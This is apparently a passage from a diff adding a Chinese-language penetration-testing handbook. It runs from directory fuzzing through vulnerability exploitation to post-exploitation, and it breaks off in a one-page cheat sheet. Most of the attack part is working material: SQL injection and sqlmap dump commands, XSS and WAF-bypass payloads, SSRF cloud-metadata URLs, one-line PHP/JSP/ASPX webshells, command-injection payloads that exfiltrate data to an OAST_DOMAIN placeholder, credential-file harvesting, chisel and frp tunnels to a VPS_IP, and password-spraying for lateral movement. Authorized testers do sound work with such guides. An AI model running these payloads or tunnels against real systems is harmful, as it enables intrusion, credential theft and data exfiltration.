+| `-t` | 并发线程 | 默认 40，内网 100+，公网 50 稳 |
+| `-rate` | 每秒请求数上限 | **防封防打死目标的保险** |
+| `-mc` | 匹配状态码 | 一般 `200,204,301,302,401,403` |
+| `-fc` | 过滤状态码 | 排除 `404` |
+| `-fs` | 过滤响应大小 | **对付自定义 404 最有效** |
+| `-ms` | 匹配响应大小 | |
+| `-fw` / `-fl` | 过滤单词数 / 行数 | |
+| `-ac` | 自动校准 | 自动学"不存在页面"特征并过滤，**必加** |
+| `-acc` | 自定义校准字符串 | 知道 404 内容时用 |
+| `-e` | 扩展名 | `-e .php,.bak,.zip,.txt,.old` |
+| `-X` | HTTP 方法 | `-X POST` |
+| `-d` | POST 数据体 | `-d "user=FUZZ&pass=1"` |
+| `-H` / `-b` | 自定义头 / Cookie | |
+| `-recursion` | 递归扫描 | |
+| `-recursion-depth` | 递归深度 | |
+| `-c` / `-v` / `-s` | 彩色 / 详细 / 静默 | 人工看用 `-c -v`，管道用 `-s` |
+| `-o` / `-of` | 输出文件 + 格式 | `json` 最好，能二次处理 |
+| `-request` | 从原始请求文件读 | 最省事，Cookie/Header 全带上 |
+| `-timeout` / `-maxtime` | 单请求超时 / 总时长 | |
+| `-p` | 请求间隔 | `-p 0.1` = 每请求隔 100ms |
+| `-x` | 走代理 | `-x http://127.0.0.1:8080` 走 Burp |
+| `-replay-proxy` | 只把命中的请求转发给代理 | 让 Burp 只记录成功结果 |
+
+**结果判读**：
+
+```
+admin        [Status: 301, Size: 178,     Words: 6,  Lines: 8,  Duration: 12ms]
+backup.zip   [Status: 200, Size: 1048576, Words: 0,  Lines: 0,  Duration: 340ms]
+.git/config  [Status: 200, Size: 312,     Words: 12, Lines: 12, Duration: 45ms]
+.env         [Status: 403, Size: 274,     Words: 10, Lines: 8,  Duration: 8ms]
+```
+
+- **301/302** → 跳转，跟着访问
+- **200 且 size 正常** → 真存在，直接下载/访问
+- **403** → 存在但被拒，**是资产**，试绕过
+- **Size 异常大** → 可能是文件下载（备份、日志）
+- **Duration 异常长** → 后端真实在处理（有用）
+
+**高频实战场景**：
+
+```bash
+# 扫文件扩展名
+ffuf -u https://example.com/FUZZ -w wordlist.txt \
+     -e .php,.bak,.zip,.rar,.tar.gz,.old,.txt,.json,.xml -fc 404 -ac
+
+# POST 参数爆破（找隐藏参数）
+ffuf -u https://example.com/api/user -X POST -d "FUZZ=1" \
+     -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fc 404 -fs 0
+
+# 参数值爆破（IDOR 数字遍历）
+ffuf -u "https://example.com/api/user?id=FUZZ" -w <(seq 1 1000) -mc all -fs 0 -H "Cookie: xxx"
+
+# 子域 + vhost
+ffuf -u https://FUZZ.example.com -w subdomains.txt -mc 200,301,302,401,403
+ffuf -u http://TARGET_IP -H "Host: FUZZ.example.com" -w subdomains.txt -fs 0
+
+# 多位置同时 fuzz
+ffuf -u "https://example.com/W1/W2" -w w1.txt:W1 -w w2.txt:W2
+```
+
+**403 绕过载荷**：
+
+```bash
+cat > $RESULT_DIR/scan/403_bypass.txt <<'EOF'
+admin/..
+admin/..;/
+/admin/
+//admin//
+/admin/.
+/admin%20
+/admin%09
+/admin%00
+/ADMIN/
+/admin;/
+/admin/./
+/admin%2f
+/./admin/
+/%2e/admin
+/admin#
+EOF
+ffuf -u "https://example.com/FUZZ" -w $RESULT_DIR/scan/403_bypass.txt -mc all -fc 404 -ac
+```
+
+**Header 伪装绕过**：
+
+```bash
+ffuf -u "https://example.com/admin" -H "X-Forwarded-For: FUZZ" -w <(printf '127.0.0.1\n0.0.0.0\n10.0.0.1\nlocalhost\n::1\n')
+# 可替换的 Header：X-Forwarded-For / X-Real-IP / X-Originating-IP / X-Remote-IP
+#                    X-Client-IP / X-Host / X-Forwarded-Host
+```
+
+**必扫高价值路径字典**：
+
+```bash
+cat > $RESULT_DIR/scan/high_value.txt <<'EOF'
+.git/config
+.git/HEAD
+.svn/entries
+.env
+.env.bak
+config.php
+config.php.bak
+config.yml
+database.yml
+settings.py
+web.config
+WEB-INF/web.xml
+backup.zip
+backup.tar.gz
+www.zip
+wwwroot.zip
+web.zip
+db.sql
+dump.sql
+administrator
+admin
+manage
+manager
+console
+login
+api
+api/v1
+api/v2
+swagger-ui.html
+swagger-ui/
+v2/api-docs
+v3/api-docs
+openapi.json
+actuator
+actuator/env
+actuator/health
+actuator/heapdump
+actuator/mappings
+druid/index.html
+druid/websession.html
+phpinfo.php
+info.php
+test.php
+shell.php
+upload
+uploads
+files
+static
+assets
+robots.txt
+sitemap.xml
+crossdomain.xml
+.well-known/security.txt
+server-status
+nginx_status
+EOF
+ffuf -u https://example.com/FUZZ -w $RESULT_DIR/scan/high_value.txt -mc all -fc 404 -ac -c
+```
+
+### 5.2 feroxbuster —— 递归体验最好
+
+ffuf 找目录后要手动加 `-recursion`，feroxbuster 默认递归，自动跟随重定向、智能去重。
+
+```bash
+feroxbuster -u https://example.com \
+    -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
+    -x php,html,bak,zip,txt \
+    -t 50 -L 4 -r --auto-tune \
+    -o $RESULT_DIR/scan/ferox.txt
+```
+
+- `-x` 扩展名／`-L` 最大递归深度／`-r` 递归
+- `--auto-tune` 自动根据响应错误调整并发
+- `-k` 忽略证书错误／`-C 404` 过滤状态码／`--filter-size` 按大小过滤
+
+### 5.3 dirsearch —— 字典和变形规则最全
+
+```bash
+dirsearch -u https://example.com \
+    -e php,html,js,zip,bak \
+    -w /usr/share/wordlists/dirsearch/db/dicc.txt \
+    -t 30 --random-agent \
+    --exclude-status=404,500 \
+    -o $RESULT_DIR/scan/dirsearch.txt --format=plain
+```
+
+- `-f` 强制加 `/` 后缀／`-r` 递归／`-R 3` 递归深度
+- `--exclude-status` / `--include-status`
+- `--exclude-texts` 排除包含特定文本的响应
+- `--proxy` 走代理／`--max-time` 总时长
+
+### 5.4 gobuster —— 一个工具三种模式
+
+```bash
+# 目录模式
+gobuster dir -u https://example.com \
+    -w /usr/share/seclists/Discovery/Web-Content/common.txt \
+    -x php,html,txt,bak -t 50 -k --random-agent \
+    -o $RESULT_DIR/scan/gobuster_dir.txt
+
+# DNS 子域模式
+gobuster dns -d example.com \
+    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+    -t 50 --wildcard -o $RESULT_DIR/recon/gobuster_dns.txt
+
+# vhost 模式
+gobuster vhost -u https://example.com \
+    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+    --append-domain -o $RESULT_DIR/recon/gobuster_vhost.txt
+```
+
+- `-k` 忽略 TLS 证书错误／`--wildcard` 泛解析下也继续扫
+- `--append-domain` vhost 模式必须加
+- `-b` 状态码黑名单／`-s` 状态码白名单
+
+### 5.5 工具对比
+
+| 工具 | 特点 | 何时用 |
+|---|---|---|
+| ffuf | 最快，参数最灵活，支持多位置 fuzz | 首选 |
+| feroxbuster | 递归体验最好，自动跟随目录 | 想省事时 |
+| dirsearch | 老牌，字典与变形规则全 | 需要它的字典时 |
+| gobuster | 简单稳定，支持 DNS/vhost 模式 | 基础场景 / 多种枚举 |
+
+### 5.6 字典位置
+
+```
+/usr/share/seclists/Discovery/Web-Content/
+├── common.txt                        # 小，快
+├── raft-small-words.txt
+├── raft-medium-directories.txt       # 中等，日常主力
+├── raft-large-directories.txt        # 大，慢而全
+├── directory-list-2.3-medium.txt     # 经典
+├── burp-parameter-names.txt          # 参数名（fuzz 参数用）
+└── spring-boot.txt / graphql.txt ... # 专项
+```
+
+---
+
+## 六、阶段 5：漏洞探测
+
+### 6.1 SQL 注入
+
+**是什么**：用户输入被拼进 SQL 语句，导致输入能改变查询语义。
+`SELECT * FROM news WHERE id='$id'`，输入 `1' OR '1'='1` 就把条件变成永真。
+
+**有什么用**：拖库、读文件（`LOAD_FILE`）、写文件（`INTO OUTFILE` 写 webshell）、MySQL UDF 提权。**危害等级最高**。
+
+#### 手工验证三连
+
+```bash
+# 1) 布尔盲注：真条件和假条件的响应应不同
+curl -s -w "\n%{size_download}\n" "https://example.com/news?id=1' and 1=1-- -"
+curl -s -w "\n%{size_download}\n" "https://example.com/news?id=1' and 1=2-- -"
+
+# 2) 报错注入：故意制造语法错误看回显
+curl -s "https://example.com/news?id=1'"
+
+# 3) 时间盲注：无回显时唯一判据
+curl -s -o /dev/null -w "%{time_total}\n" "https://example.com/news?id=1' and sleep(5)-- -"
+# 返回 5 秒以上 → 确认存在
+```
+
+#### sqlmap 基础用法
+
+```bash
+# GET 参数
+sqlmap -u "https://example.com/news?id=1" --batch --random-agent
+
+# POST 表单
+sqlmap -u "https://example.com/login" --data="user=admin&pass=1" --batch
+
+# 带 Cookie（有登录态）
+sqlmap -u "https://example.com/api?id=1" --cookie="PHPSESSID=abc123" --batch
+
+# 从 Burp 原始请求包读（最省事，什么都带上了）
+# Burp 里右键 → Copy to file 存成 req.txt
+sqlmap -r req.txt --batch
+
+# 指定注入位置
+sqlmap -u "https://example.com/a?id=1&name=x" -p id --batch
+
+# 自定义 Header
+sqlmap -u "URL" --headers="X-Forwarded-For: 127.0.0.1\nUser-Agent: xxx"
+```
+
+#### 核心参数
+
+| 参数 | 含义 |
+|---|---|
+| `-u` / `-r` | 目标 URL / 请求文件 |
+| `--data` | POST 数据 |
+| `--cookie` | Cookie |
+| `--batch` | 全部用默认答案，不交互 |
+| `--random-agent` | 随机 UA |
+| `--level 1-5` | 测试深度，3 会测 Cookie/Referer/UA |
+| `--risk 1-3` | 3 会发 UPDATE 类 payload，**生产库别用 3** |
+| `--technique` | B 布尔 E 报错 U 联合 S 堆叠 T 时间 |
+| `--dbms` | 指定数据库类型，省探测时间 |
+| `--threads` | 并发（时间盲注别开高） |
+| `--tamper` | WAF 绕过脚本 |
+| `--os-shell` | 尝试 getshell |
+| `--file-read` | 读服务器文件 |
+| `--delay` | 每请求间隔（防封） |
+| `--flush-session` | 清缓存（重试时要清） |
+| `-v 3` | 显示实际 payload |
+
+#### 拿到注入点之后
+
+```bash
+sqlmap -u "URL" --dbs                          # 列所有数据库
+sqlmap -u "URL" -D dbname --tables             # 列表
+sqlmap -u "URL" -D dbname -T users --columns   # 列字段
+sqlmap -u "URL" -D dbname -T users --dump      # 拖数据（自动爆破哈希）
+sqlmap -u "URL" -D dbname -T users -C user,pass --dump --where="id<10"
+sqlmap -u "URL" --current-user --is-dba --privileges
+sqlmap -u "URL" --file-read="/etc/passwd"
+sqlmap -u "URL" --os-shell
+```
+
+#### WAF 绕过
+
+```bash
+sqlmap -u "URL" --tamper=space2comment,randomcase,charencode,between --random-agent
+sqlmap --list-tampers     # 看全部
+```
+
+| tamper | 作用 |
+|---|---|
+| `space2comment` | 空格换 `/**/` |
+| `space2plus` | 空格换 `+` |
+| `randomcase` | 关键字随机大小写 |
+| `charencode` | URL 全编码 |
+| `between` | `>` 换 `BETWEEN` |
+| `modsecurityversioned` | 绕 ModSecurity |
+| `apostrophemask` | 单引号换 UTF-8 全角 |
+
+### 6.2 XSS
+
+**是什么**：用户输入被当 HTML/JS 执行。`<script>alert(1)</script>` 弹窗即证明。分反射型 / 存储型 / DOM 型。
+
+**有什么用**：偷 Cookie/token 劫持会话、打管理后台、配合 CSRF、蠕虫传播。
+
+```bash
+# 手工
+curl "https://example.com/search?q=<script>alert(1)</script>"
+curl "https://example.com/search?q=\"><img src=x onerror=alert(1)>"
+```
+
+#### dalfox
+
+```bash
+dalfox url "https://example.com/search?q=test" --cookie "xx=yy" --blind https://OAST_DOMAIN
+dalfox file $RESULT_DIR/recon/urls_params.txt --worker 10 --blind https://OAST_DOMAIN
+dalfox url "https://example.com/comment" --data "content=test" --cookie "x=y"
+
+# 常用参数
+dalfox url "URL" \
+  --cookie "xx=yy" \
+  --header "X-Forwarded-For: 127.0.0.1" \
+  --blind https://OAST_DOMAIN \    # 盲打外带
+  --mining-dom \                   # 挖 DOM 型
+  --mining-dict \                  # 字典挖参数
+  --waf-evasion \                  # WAF 绕过模式
+  --deep-domxss \                  # 深度 DOM 检测
+  --output $RESULT_DIR/vuln/xss.txt --format json
+```
+
+`--blind` 是关键：盲打 XSS 时把 payload 发到 OAST 服务器，收到回连即证明存在。
+
+#### WAF 绕过载荷集
+
+```bash
+cat > $RESULT_DIR/vuln/xss_payloads.txt <<'EOF'
+<script>alert(1)</script>
+<ScRiPt>alert(1)</sCrIpT>
+<script >alert(1)</script>
+<script/src=//x.co/x.js></script>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert`1`>
+<svg/onload=alert(1)>
+<svg><script>alert(1)</script></svg>
+<iframe src=javascript:alert(1)>
+<a href="javascript:alert(1)">x</a>
+<body onload=alert(1)>
+<input autofocus onfocus=alert(1)>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+&#60;script&#62;alert(1)&#60;/script&#62;
+<scr<script>ipt>alert(1)</script>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>alert(String.fromCharCode(88,83,83))</script>
+EOF
+```
+
+### 6.3 interactsh-client —— OAST 外带服务器（盲打必备）
+
+**是什么**：起一个临时域名，任何对该域名的请求（DNS/HTTP/SMTP）都会被记录并通知你。
+
+**有什么用**：SSRF、盲 XSS、盲命令注入、XXE、Log4j 这类**无回显漏洞，唯一验证手段就是让目标主动回连你**。
+
+```bash
+interactsh-client -v
+# 输出一个域名，比如 d3f4ult123.oast.fun，把它当 payload 一部分发出去
+
+interactsh-client -v -n 5                              # 只收 5 个交互后退出
+interactsh-client -json -o $RESULT_DIR/vuln/oast.jsonl
+interactsh-client -sf $RESULT_DIR/vuln/oast.txt        # 域存文件
+```
+
+收到回连：
+
+```
+[ABC123] Received DNS interaction from 1.2.3.4 at 2024-01-01 12:00:00
+```
+
+**有这条记录 = 漏洞确认**，哪怕页面上什么都没变。
+
+### 6.4 SSRF
+
+**是什么**：服务器端请求伪造。程序接受 URL 参数去访问，攻击者传内网地址，服务器就替你去访问内网。
+
+**有什么用**：内网探测、访问云元数据拿 AK/SK、打内网未授权服务（Redis/ES/Memcached）、读写本地文件。
+
+```bash
+# 回环地址的各种写法（绕过黑名单）
+http://127.0.0.1:80
+http://localhost:8080
+http://0177.0.0.1/            # 八进制
+http://2130706433/            # 十进制
+http://0x7f000001/            # 十六进制
+http://127.1/                 # 简写
+http://[::1]/                 # IPv6
+http://127.0.0.1.nip.io/      # DNS 重绑定服务
+
+# 文件读取
+file:///etc/passwd
+file:///c:/windows/win.ini
+dict://127.0.0.1:6379/info
+
+# 云元数据（拿到就是完全接管云账号）
+http://169.254.169.254/latest/meta-data/iam/security-credentials/    # AWS
+http://100.100.100.200/latest/meta-data/                             # 阿里云
+http://metadata.google.internal/computeMetadata/v1/                  # GCP（需 Header）
+
+# 打内网 Redis 写计划任务（gopher）
+gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A...
+```
+
+**盲 SSRF 验证**：
+
+```bash
+# 1) 起 OAST
+interactsh-client -v          # 拿到 abc.oast.fun
+
+# 2) 参数换成 OAST 域名
+curl "https://example.com/api/fetch?url=http://abc.oast.fun"
+
+# 3) 看 interactsh 有没有收到
+```
+
+**用 OAST 做内网端口探测**：
+
+```bash
+for p in 80 443 3306 6379 8080 9200; do
+  curl -s "https://example.com/api/fetch?url=http://127.0.0.1:$p.abc.oast.fun/" &
+done
+```
+
+### 6.5 越权与未授权访问
+
+**是什么**：
+
+- **水平越权**：改 ID 看别人数据，`/api/user/1001` → `/api/user/1002`
+- **垂直越权**：普通用户调管理员接口
+- **未授权访问**：不登录就能调
+
+**有什么用**：直接拿全站数据或管理权限，实战中最常见的拿下方式，不需什么技术，靠耐心。
+
+```bash
+# 1) 双账号对照：注册 A、B，A 的请求换 B 的 token 重放
+curl -H "Authorization: Bearer TOKEN_B" "https://example.com/api/orders/1001"
+# 返回了 A 的订单 → 水平越权
+
+# 2) ID 遍历
+ffuf -u "https://example.com/api/orders/FUZZ" -w <(seq 1000 1100) \
+     -H "Authorization: Bearer TOKEN_A" -mc all -fs 0 -o $RESULT_DIR/vuln/idor.json
+
+# 3) 删掉鉴权头
+curl "https://example.com/api/admin/users"
+curl -H "Authorization: " "https://example.com/api/admin/users"
+
+# 4) 换 HTTP 方法绕过中间件
+for m in GET POST PUT DELETE PATCH OPTIONS HEAD; do
+  echo -n "$m: "; curl -s -o /dev/null -w "%{http_code}\n" -X $m "https://example.com/api/admin/users"
+done
+
+# 5) 路径变形绕过鉴权中间件
+/api/Admin/users
+/api/admin/users/
+/api/admin/users.json
+/api/./admin/users
+/api/admin/users;.js
+/api//admin/users
+/api/admin/users%20
+/api/admin/users%09
+```
+
+**Autorize 插件**（Burp）：配置低权限账号 Cookie，自动把所有请求换身份重放一遍，标出 200/403 差异。做越权效率最高。
+
+**常见高价值未授权接口**：
+
+```
+/api/v1/user/list
+/api/user/info?id=1
+/actuator/env          # Spring Boot
+/druid/websession.html # Druid 会话
+/manager/html          # Tomcat
+/console               # WebLogic / JBoss
+/api-docs              # Swagger
+/graphql               # 内省查询列出所有 schema
+```
+
+**GraphQL 内省**：
+
+```bash
+curl -X POST https://example.com/graphql \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{__schema{types{name fields{name}}}}"}' | python3 -m json.tool
+```
+
+### 6.6 文件上传
+
+**是什么**：上传点只查扩展名或 MIME，没验证内容，导致能传可执行脚本。
+
+**有什么用**：直接拿 webshell，通常是最快的拿权限路径。
+
+```bash
+# 1) 基础尝试
+shell.php
+shell.php.jpg          # 双扩展名
+shell.php%00.jpg        # 空字节截断（老 PHP）
+shell.pHp               # 大小写
+shell.php5 shell.phtml shell.pht
+shell.jsp shell.jspx shell.jspf
+shell.asp shell.aspx shell.ashx shell.asmx
+
+# 2) Content-Type 伪造
+curl -F "file=@shell.php;type=image/jpeg" https://example.com/upload
+
+# 3) 图片马
+cat normal.jpg shell.php > shell.jpg
+printf 'GIF89a' > shell.gif && cat shell.php >> shell.gif    # 加 GIF 头绕内容检测
+
+# 4) .htaccess 让 jpg 被当 PHP 解析（Apache）
+echo 'AddType application/x-httpd-php .jpg' > .htaccess      # 先传这个，再传 shell.jpg
+
+# 5) 文件名路径穿越
+filename="../../shell.php"
+filename="..%2f..%2fshell.php"
+filename="....//....//shell.php"
+
+# 6) 超长文件名截断
+filename="aaa...aaa.php.jpg"
+
+# 7) 传完访问确认
+curl "https://example.com/uploads/shell.jpg?cmd=id"
+```
+
+**一句话 webshell**：
+
+```php
+<?php system($_GET['cmd']); ?>
+<?=`$_GET[0]`?>
+<?php eval($_POST[1]);?>
+```
+
+```jsp
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+```
+
+```aspx
+<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe","/c "+Request["cmd"]); %>
+```
+
+### 6.7 命令注入
+
+**是什么**：用户输入被拼进系统命令。`ping -c 1 $ip` 里输入 `1.1.1.1; whoami`。
+
+**有什么用**：直接 RCE。
+
+```bash
+# 基础分隔符
+1.1.1.1;id
+1.1.1.1|id
+1.1.1.1||id
+1.1.1.1&&id
+1.1.1.1`id`
+1.1.1.1$(id)
+1.1.1.1%0aid       # 换行符
+1.1.1.1%0d%0aid
+
+# 空格被过滤
+1.1.1.1;cat${IFS}/etc/passwd
+1.1.1.1;cat</etc/passwd
+1.1.1.1;{cat,/etc/passwd}
+
+# 关键字被过滤
+1.1.1.1;c\at /etc/passwd
+1.1.1.1;/bin/c?t /etc/passwd
+1.1.1.1;'c'a't' /etc/passwd
+
+# 无回显：延时验证
+1.1.1.1;sleep 5
+1.1.1.1;ping -c 5 127.0.0.1
+
+# 无回显：DNS 外带
+1.1.1.1;nslookup `whoami`.OAST_DOMAIN
+1.1.1.1;curl http://OAST_DOMAIN/`id|base64 -w0`
+1.1.1.1;ping -c 1 `cat /etc/hostname`.OAST_DOMAIN
+```
+
+**判据**：延时 + OAST 回连 = 确认。不要只看页面回显，很多是盲的。
+
+### 6.8 逻辑漏洞
+
+**是什么**：代码逻辑有缺陷，技术上都"正常"，但业务上不该发生。**自动化工具扫不出来，全靠理解业务**。
+
+**有什么用**：改价、白拿、越权、刷积分。实战中往往是最短路径。
+
+**测试点清单**：
+
+- **支付金额篡改**：改 `price=100` → `0.01` 或 `-1`；改 `quantity=-1` 导致退款
+- **优惠券/积分**：叠加使用、并发领取、自己推荐自己、积分兑换为负
+- **验证码**：可复用（同码多次提交）、可爆破（无次数限制）、可为空、前端校验可跳过（删 JS 直接发请求）
+- **短信/邮件轰炸**：无频率限制
+- **密码找回**：验证码 4 位可爆破、响应包直接给 token、返回包带明文答案
+- **并发竞态**：余额 100，同时发 10 个转账 100 的请求
+- **支付状态**：跳过支付直接访问成功页、改订单状态字段
+- **越权改价/改数量**：改 `userId` 帮别人下单
+
+```bash
+# 并发测试
+seq 1 50 | xargs -P 50 -I {} curl -s -X POST "https://example.com/api/withdraw" \
+    -H "Cookie: xxx" -d "amount=100" -o /dev/null
+
+ffuf -u "https://example.com/api/withdraw" -X POST -d "amount=100" \
+     -H "Cookie: xxx" -w <(seq 1 50) -t 50 -mc all
+
+# Burp Turbo Intruder：精确控制并发窗口（专业做法）
+```
+
+---
+
+## 七、阶段 6：权限获取与横向移动
+
+### 7.1 上线后第一件事：再收集一次
+
+```bash
+whoami; id; hostname; uname -a; ip a
+cat /etc/passwd
+cat /etc/shadow                        # 能读就直接 john 爆破
+cat ~/.bash_history                    # 历史命令常有口令
+env                                    # 环境变量常有 DB_PASSWORD
+ps aux                                 # 什么服务以什么权限跑
+netstat -antp                          # 内网连接，找内网服务
+cat /etc/crontab; ls -la /etc/cron.d/  # 计划任务提权点
+
+find / -name "*.conf" -o -name "*.properties" -o -name "*.yml" 2>/dev/null
+find / -name "web.config" -o -name ".env" -o -name "database.php" 2>/dev/null
+```
+
+**配置文件里的金矿**：
+
+```bash
+grep -rEi "(password|passwd|pwd|secret|token|api_?key|access_?key)" /var/www/ /opt/ 2>/dev/null
+
+cat ~/.aws/credentials ~/.aws/config      # AWS
+cat ~/.aliyun/config.json                 # 阿里云
+cat ~/.kube/config                        # K8s 凭据 = 整个集群
+cat /var/run/secrets/kubernetes.io/serviceaccount/token   # 容器内
+```
+
+### 7.2 linpeas —— Linux 提权自动枚举
+
+**用途**：上 shell 后第一件事。自动枚举所有可疑提权点：SUID、sudo 配置、内核版本、可写服务、可写 cron、明文口令、环境变量。
+
+```bash
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/lp.sh
+chmod +x /tmp/lp.sh
+/tmp/lp.sh 2>/dev/null | tee /tmp/lp.out
+/tmp/lp.sh -a          # 只跑快速检查
+```
+
+**结果判读**（红色 = 高危）：
+
+```
+╔══════════╣ SUID - Check easy privesc
+-rwsr-xr-x 1 root root /usr/bin/find      ← find 有 SUID，能执行任意命令
+-rwsr-xr-x 1 root root /usr/bin/vim
+
+╔══════════╣ Sudo version / sudo -l
+User www-data may run the following commands:
+    (ALL) NOPASSWD: /usr/bin/awk            ← awk 能执行系统命令
+
+╔══════════╣ Cron jobs
+*/5 * * * * root /opt/scripts/backup.sh    ← 检查脚本是否可写
+```
+
+**手工提权核心命令**：
+
+```bash
+whoami; id                                    # 当前权限
+sudo -l                                        # 能 sudo 什么（最重要）
+find / -perm -4000 -type f 2>/dev/null         # SUID
+find / -perm -2000 -type f 2>/dev/null         # SGID
+getcap -r / 2>/dev/null                        # capabilities
+find / -writable -type d 2>/dev/null           # 可写目录
+cat /etc/crontab; ls -la /etc/cron.*           # 计划任务
+ls -la /etc/passwd /etc/shadow                 # 能否改 passwd
+uname -a                                        # 内核版本 → 查 CVE
+env                                             # 环境变量
+cat ~/.bash_history                             # 历史命令
+```
+
+参考：`https://gtfobins.github.io/` —— 查某个 SUID 程序怎么用来提权。
+
+### 7.3 winPEAS —— Windows 提权枚举
+
+```powershell
+.\winPEASx64.exe
+.\winPEASx64.exe quiet cmd fast
+```
+
+关注：`whoami /priv`（`SeImpersonatePrivilege` → Potato 系列）、未引用的服务路径、可写的服务二进制、AlwaysInstallElevated、存储的凭据。
+
+### 7.4 fscan —— 内网快速扫描
+
+**用途**：内网一把梭。存活主机 + 端口 + 服务识别 + 常见未授权 + 弱口令爆破。
+
+```bash
+./fscan -h 10.0.0.0/24 -p 22,80,443,445,1433,3306,5432,6379,9200,27017 \
+        -o $RESULT_DIR/scan/fscan.txt
+```
+
+| 参数 | 含义 |
+|---|---|
+| `-h` | 目标（IP / 网段 / 文件，逗号分隔） |
+| `-p` | 端口（支持 `1-65535`） |
+| `-o` | 输出文件 |
+| `-t` | 并发（默认 600） |
+| `-np` | 跳过存活探测 |
+| `-nobr` | 不爆破 |
+| `-pwdf` / `-userf` | 密码 / 用户名字典 |
+
+**结果判读**：
+
+```
+10.0.0.5:6379 open                ← Redis 开放
+10.0.0.5:6379 Redis unauthorized  ← Redis 未授权！直接读写
+10.0.0.7:3306 open  mysql  weak password: root/123456
+```
+
+### 7.5 chisel —— 内网隧道（最简单）
+
+```bash
+# VPS（服务端）
+chisel server -p 8080 --reverse
+
+# 目标（客户端，只需上传一个二进制）
+chisel client VPS_IP:8080 R:socks                          # 起 SOCKS5 在 VPS 的 1080
+chisel client VPS_IP:8080 R:13389:10.0.0.5:3389            # 映射单个端口
+chisel client VPS_IP:8080 8080:10.0.0.5:80                 # 本地转发
+```
+
+**走代理打内网**：
+
+```bash
+echo "socks5 127.0.0.1 1080" | sudo tee -a /etc/proxychains4.conf
+
+proxychains4 nmap -sT -Pn -p 80,443,3306 10.0.0.0/24
+proxychains4 curl http://10.0.0.5/
+proxychains4 ffuf -u http://10.0.0.5/FUZZ -w wordlist.txt
+```
+
+> **注意**：proxychains 只代理 TCP，ICMP 和 UDP 不通，所以 `nmap -sS` 和 `ping` 会失效，必须用 `-sT -Pn`。
+
+### 7.6 frp —— 功能更全的隧道
+
+```ini
+# frps.ini（VPS）
+[common]
+bind_port = 7000
+token = yourtoken
+
+# frpc.ini（目标）
+[common]
+server_addr = VPS_IP
+server_port = 7000
+token = yourtoken
+
+[socks5]
+type = tcp
+remote_port = 6000
+plugin = socks5
+plugin_user = user
+plugin_passwd = pass
+
+[rdp]
+type = tcp
+local_ip = 10.0.0.5
+local_port = 3389
+remote_port = 13389
+```
+
+```bash
+./frps -c frps.ini      # VPS
+./frpc -c frpc.ini      # 目标
+```
+
+### 7.7 neoreg —— HTTP 隧道（目标不出网时用）
+
+**用途**：目标只能访问 Web，不能连外网端口。neoreg 把隧道伪装成 HTTP 请求，走 80/443 出去。
+
+```bash
+python3 neoreg.py generate -k password
+# 得到 tunnel.php / tunnel.jsp / tunnel.aspx
+
+curl "https://example.com/tunnel.php"      # 上传后确认能通
+
+python3 neoreg.py -k password -u https://example.com/tunnel.php
+# 默认在本地起 SOCKS5 1080
+```
+
+### 7.8 横向移动逻辑
+
+核心是**找凭证复用**：同一套 LDAP 口令、同一个 SSH key、同一份配置。
+
+```bash
+# 拿到一个密码，试同网段所有机器
+crackmapexec smb 10.0.0.0/24 -u admin -p 'Password123' --continue-on-success
+crackmapexec ssh 10.0.0.0/24 -u root -p 'Password123'
+
+# 拿到一个 SSH 私钥，试所有机器
+for ip in $(cat ips.txt); do
+  ssh -i id_rsa -o BatchMode=yes -o ConnectTimeout=3 root@$ip 'id'
+done
+```
+
+Windows 域环境另有一条线：`BloodHound` 画域内攻击路径、`mimikatz` 抓内存凭证、Kerberoasting、`PsExec`/`WMI` 横向执行。
+
+---
+
+## 八、阶段 7：后渗透纪律与报告
+
+### 8.1 纪律
+
+- **留证据不留破坏**：证明命令用 `whoami` / `id` / `hostname`，不要 `rm`、不要改数据、不要装持久化后门
+- **敏感数据脱敏**：拖库只截前几行，报告里身份证/手机号打码
+- **每条漏洞必须有最小可重放的请求包**，否则修复方无法复现
+- **一次只改一个变量**：同时改三处，出了差异不知道是哪个起作用
+- **扫描器输出必须人工复核**：误报比漏报更耗信任
+- **`--rate` / `-t` 别开太高**，把目标打挂比打不进去更糟
+
+### 8.2 报告结构
+
+```
+1. 概述：测试范围、时间窗口、授权依据
+2. 资产面：域名 / IP / 端口 / 中间件清单
+3. 漏洞清单（按风险从高到低）：
+   每条包含：
+   - 漏洞名称 + 风险等级（严重/高/中/低）
+   - 受影响 URL
+   - 复现步骤（编号，照着做能复现）
+   - 原始请求/响应包
+   - 危害说明
+   - 修复建议（具体到代码层面）
+4. 修复后复测记录
+5. 附录：RESULT_DIR 目录结构
+```
+
+### 8.3 结果整理
+
+```bash
+# ffuf json → 可读列表
+cat $RESULT_DIR/scan/ffuf_dir.json | python3 -c "
+import json,sys
+d=json.load(sys.stdin)
+for r in d['results']:
+    print(f\"{r['status']:>4}  {r['length']:>8}  {r['url']}\")
+" | sort -n > $RESULT_DIR/scan/ffuf_readable.txt
+```
+
+---
+
+## 九、全流程一页速查
+
+```bash
+export D="example.com"
+export R="$HOME/pentest/$D"
+mkdir -p $R/{recon,scan,vuln,loot,evidence}
+
+# ── 1. 子域枚举 ──
+subfinder -d $D -all -silent | anew $R/recon/subs.txt
+assetfinder --subs-only $D     | anew $R/recon/subs.txt
+amass enum -passive -d $D -silent | anew $R/recon/subs.txt
+puredns bruteforce /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt $D \
+    -r $R/recon/resolvers.txt --write $R/recon/brute.txt
+cat $R/recon/brute.txt | anew $R/recon/subs.txt
+
+# ── 2. DNS 解析 → IP ──
+dnsx -l $R/recon/subs.txt -a -resp -silent -o $R/recon/domain_ip.txt
+awk '{print $2}' $R/recon/domain_ip.txt | tr -d '[]' | sort -u > $R/recon/ips.txt
+
+# ── 3. 存活 + 指纹 + 过滤 CDN ──
